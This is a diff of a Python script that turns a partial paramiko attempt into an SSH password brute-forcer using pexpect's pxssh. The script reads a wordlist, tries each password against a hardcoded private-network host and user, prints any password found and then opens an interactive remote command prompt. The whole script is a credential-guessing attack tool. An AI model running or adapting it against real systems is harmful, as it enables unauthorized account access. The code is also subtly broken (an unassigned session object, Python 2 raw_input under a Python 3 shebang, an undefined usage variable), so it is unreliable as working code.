@@ -1,16 +1,37 @@
 #!/usr/bin/env python3
-import paramiko, sys, os, socket
+from pexpect import pxssh
+import sys
+import time
 
-global host, username, line, input_file
-line= "\n-----------------------------------------------------------------\n"
+def connect(host, user, password):
+    try:
+        s.pxssh.pxssh()
+        s.login(host,user,password)
+        print("Password found" + password)
+        return s
+    except Exception as e:
+        print(Exception)
 
-try:
+def main():
     host="192.168.29.150"
-    username="jeff"
-    input_file= "/home/jeff/Desktop/sample.txt"
+    user="jeff"
+    dictionary="/home/jeff/Desktop/sample.txt"
 
-    if os.path.exists(input_file) == False:
-        print("Path does not exist!")
-def ssh_connect(password):
-    ssh=paramiko.SSHClient()
-    ssh.set_
+    if host and user and dictionary:
+        with open(dictionary) as infile:
+            for line in infile:
+                password =line.strip('\r\n')
+                print("testing: " + str(password))
+                con = connect(host, user, password)
+                if con:
+                    print("SSH connected")
+                    command = raw_input(">")
+                    while command != "q" and command != "Q":
+                        con.sendline(command)
+                        con.prompt()
+                        print(con.before)
+                        command = raw_input(">")
+    else:
+        print(usage)
+        exit(0)
+main()
